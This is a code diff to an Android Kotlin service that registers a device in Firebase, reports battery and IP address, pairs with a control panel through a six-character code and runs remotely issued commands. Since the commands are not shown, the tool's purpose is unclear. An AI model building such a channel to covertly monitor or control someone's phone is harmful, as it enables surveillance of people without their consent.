@@ -12,10 +12,11 @@ import com.abuzahra.app.utils.DeviceInfo
 import com.abuzahra.app.utils.NotificationHelper
 import kotlinx.coroutines.*
 import kotlin.coroutines.CoroutineContext
+import java.util.Random
 
 class FirebaseListenerService : Service(), CoroutineScope {
 
-    private val TAG = "FirebaseListenerService"
+    private val TAG = "FirebaseListener"
     private val job = Job()
     override val coroutineContext: CoroutineContext = Dispatchers.IO + job
 
@@ -27,7 +28,7 @@ class FirebaseListenerService : Service(), CoroutineScope {
 
     override fun onCreate() {
         super.onCreate()
-        Log.d(TAG, "Service onCreate - Device: $deviceId")
+        Log.d(TAG, "onCreate - Device: $deviceId")
 
         startForeground(
             Constants.NOTIFICATION_ID,
@@ -36,12 +37,13 @@ class FirebaseListenerService : Service(), CoroutineScope {
 
         initFirebase()
         sendDeviceRegistration()
+        generateLinkCode()
         startHeartbeat()
         listenForCommands()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
-        Log.d(TAG, "Service onStartCommand")
+        Log.d(TAG, "onStartCommand")
         return START_STICKY
     }
 
@@ -49,7 +51,7 @@ class FirebaseListenerService : Service(), CoroutineScope {
 
     private fun initFirebase() {
         database = FirebaseDatabase.getInstance().reference
-        Log.d(TAG, "Firebase initialized for device: $deviceId")
+        Log.d(TAG, "Firebase initialized")
     }
 
     private fun sendDeviceRegistration() {
@@ -71,30 +73,69 @@ class FirebaseListenerService : Service(), CoroutineScope {
                     "info" to deviceInfo
                 )
                 database.child("devices").child(deviceId).setValue(deviceData)
-                Log.d(TAG, "Device registered successfully")
+                Log.d(TAG, "Device registered: $deviceId")
             } catch (e: Exception) {
-                Log.e(TAG, "Failed to register device", e)
+                Log.e(TAG, "Registration failed", e)
             }
         }
+    }
+
+    /**
+     * Generate a 6-character link code and save it to Firebase.
+     * The control panel app reads this code to link the device.
+     */
+    private fun generateLinkCode() {
+        launch {
+            try {
+                val code = generateCode()
+                Log.d(TAG, "Link code: $code")
+
+                // Save to Firebase under /linkCodes/{code}
+                val linkData = mapOf(
+                    "deviceId" to deviceId,
+                    "used" to false,
+                    "createdAt" to ServerValue.TIMESTAMP,
+                    "deviceName" to "${DeviceInfo.getDeviceBrand()} ${DeviceInfo.getDeviceModel()}"
+                )
+                database.child("linkCodes").child(code).setValue(linkData)
+                    .addOnSuccessListener {
+                        Log.d(TAG, "Link code saved: $code")
+                        // Update notification with code
+                        NotificationHelper.updateNotificationWithCode(this@FirebaseListenerService, code)
+                    }
+                    .addOnFailureListener { e ->
+                        Log.e(TAG, "Failed to save link code", e)
+                    }
+            } catch (e: Exception) {
+                Log.e(TAG, "generateLinkCode error", e)
+            }
+        }
+    }
+
+    private fun generateCode(): String {
+        val chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
+        val random = Random()
+        val sb = StringBuilder()
+        for (i in 0 until 6) {
+            sb.append(chars[random.nextInt(chars.length)])
+        }
+        return sb.toString()
     }
 
     private fun startHeartbeat() {
         heartbeatJob = launch {
             while (isActive) {
                 try {
-                    val heartbeat = mapOf(
-                        "timestamp" to System.currentTimeMillis(),
-                        "battery" to getBatteryLevel(),
-                        "network" to DeviceInfo.getIPAddress()
-                    )
-                    database.child("devices").child(deviceId).child("heartbeat")
-                        .setValue(heartbeat)
-                    database.child("devices").child(deviceId).child("lastSeen")
-                        .setValue(ServerValue.TIMESTAMP)
-                    database.child("devices").child(deviceId).child("battery")
-                        .setValue(getBatteryLevel())
-                    database.child("devices").child(deviceId).child("active")
-                        .setValue(true)
+                    database.child("devices").child(deviceId).apply {
+                        child("heartbeat").setValue(mapOf(
+                            "timestamp" to System.currentTimeMillis(),
+                            "battery" to getBatteryLevel(),
+                            "network" to DeviceInfo.getIPAddress()
+                        ))
+                        child("lastSeen").setValue(ServerValue.TIMESTAMP)
+                        child("battery").setValue(getBatteryLevel())
+                        child("active").setValue(true)
+                    }
                 } catch (e: Exception) {
                     Log.e(TAG, "Heartbeat failed", e)
                 }
@@ -118,21 +159,34 @@ class FirebaseListenerService : Service(), CoroutineScope {
 
                             Log.d(TAG, "Command received: $cmdName")
 
-                            // Remove the command from Firebase after reading
+                            // Remove command after reading
                             database.child("devices").child(deviceId).child("command")
                                 .removeValue()
 
-                            // Execute command
+                            // Execute
                             val executor = CommandExecutor(this@FirebaseListenerService)
                             val result = executor.execute(cmdName, params)
 
-                            // Send result back to Firebase
+                            // Convert result to string for the control panel
+                            val resultStr = when (result) {
+                                is Map<*, *> -> {
+                                    val sb = StringBuilder()
+                                    for ((k, v) in result) {
+                                        sb.append("$k: $v\n")
+                                    }
+                                    sb.toString().trim()
+                                }
+                                is String -> result
+                                is List<*> -> result.joinToString("\n")
+                                else -> result.toString()
+                            }
+
+                            // Send result back
                             val resultData = mapOf(
                                 "command" to cmdName,
                                 "status" to "completed",
-                                "result" to result,
-                                "timestamp" to System.currentTimeMillis(),
-                                "deviceTimestamp" to cmdTimestamp
+                                "result" to resultStr,
+                                "timestamp" to System.currentTimeMillis()
                             )
                             database.child("devices").child(deviceId).child("result")
                                 .setValue(resultData)
@@ -141,20 +195,18 @@ class FirebaseListenerService : Service(), CoroutineScope {
                         }
                     } catch (e: Exception) {
                         Log.e(TAG, "Command execution error", e)
-                        val errorResult = mapOf(
-                            "status" to "error",
-                            "error" to (e.message ?: "Unknown error"),
-                            "timestamp" to System.currentTimeMillis()
-                        )
                         database.child("devices").child(deviceId).child("result")
-                            .setValue(errorResult)
+                            .setValue(mapOf(
+                                "status" to "error",
+                                "result" to (e.message ?: "Unknown error"),
+                                "timestamp" to System.currentTimeMillis()
+                            ))
                     }
                 }
             }
 
             override fun onCancelled(error: DatabaseError) {
-                Log.e(TAG, "Firebase listener cancelled", error.toException())
-                // Reconnect after delay
+                Log.e(TAG, "Listener cancelled", error.toException())
                 launch {
                     delay(5000)
                     listenForCommands()
@@ -164,7 +216,7 @@ class FirebaseListenerService : Service(), CoroutineScope {
 
         database.child("devices").child(deviceId).child("command")
             .addValueEventListener(commandListener as ValueEventListener)
-        Log.d(TAG, "Listening for commands on: devices/$deviceId/command")
+        Log.d(TAG, "Listening: devices/$deviceId/command")
     }
 
     private fun getBatteryLevel(): Int {
@@ -174,9 +226,7 @@ class FirebaseListenerService : Service(), CoroutineScope {
             val level = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1) ?: 0
             val scale = batteryStatus?.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, 100) ?: 100
             (level * 100 / scale)
-        } catch (e: Exception) {
-            0
-        }
+        } catch (e: Exception) { 0 }
     }
 
     override fun onDestroy() {
